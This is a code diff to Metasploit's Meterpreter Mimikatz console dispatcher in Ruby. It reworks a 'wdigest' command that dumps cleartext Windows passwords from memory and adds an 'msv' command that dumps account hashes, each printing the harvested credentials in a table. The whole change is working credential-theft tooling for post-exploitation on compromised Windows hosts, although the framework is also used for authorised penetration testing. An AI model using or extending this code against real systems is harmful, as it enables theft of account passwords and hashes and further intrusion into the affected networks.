@@ -30,37 +30,66 @@ class Console::CommandDispatcher::Mimikatz
 	def commands
 		{
 			"wdigest" => "Attempt to retrieve cleartext wdigest passwords",
+			"msv" => "Attempt to retrieve hashes",
 		}
 	end
 
 	def cmd_wdigest(*args)
-		system_privilege_check
-		print_status("Getting privileges")
-		client.sys.config.getprivs
-		print_status("Retrieving passwords")
-		accounts = client.mimikatz.wdigest
-		
-		table = Rex::Ui::Text::Table.new(
-			'Indent' => 0,
-			'SortIndex' => 4,
-			'Columns' =>
-			[
-				'AuthID', 'Package', 'Domain', 'User', 'Password'
-			]
-		)
-			
-		accounts.each do |acc|
-			table << [acc[:authid], acc[:package], acc[:domain], acc[:user],  acc[:password]]	
-		end
+		unless system_check
+                        print_status("Attempting to get getprivs")
+                        client.sys.config.getprivs
+                end
+                print_status("Retrieving passwords")
+                accounts = client.mimikatz.wdigest
+                
+                table = Rex::Ui::Text::Table.new(
+                        'Indent' => 0,
+                        'SortIndex' => 4,
+                        'Columns' =>
+                        [
+                                'AuthID', 'Package', 'Domain', 'User', 'Password'
+                        ]
+                )
+                        
+                accounts.each do |acc|
+                        table << [acc[:authid], acc[:package], acc[:domain], acc[:user],  acc[:password]]       
+                end
 
-		table.print	
+                table.print     
 
-		return true
+                return true
 	end
 
-	def system_privilege_check
+	def cmd_msv(*args)
+                unless system_check
+                        print_status("Attempting to get getprivs")
+                        client.sys.config.getprivs
+                end
+                print_status("Retrieving passwords")
+                accounts = client.mimikatz.msv
+                
+                table = Rex::Ui::Text::Table.new(
+                        'Indent' => 0,
+                        'SortIndex' => 4,
+                        'Columns' =>
+                        [
+                                'AuthID', 'Package', 'Domain', 'User', 'Hash'
+                        ]
+                )
+                        
+                accounts.each do |acc|
+                        table << [acc[:authid], acc[:package], acc[:domain], acc[:user],  acc[:password]]       
+                end
+
+                table.print     
+
+                return true
+	end
+
+	def system_check
 		if (client.sys.config.getuid != "NT AUTHORITY\\SYSTEM")
 			print_warning("Not currently running as SYSTEM")
+			return false
 		end
 
 		return true
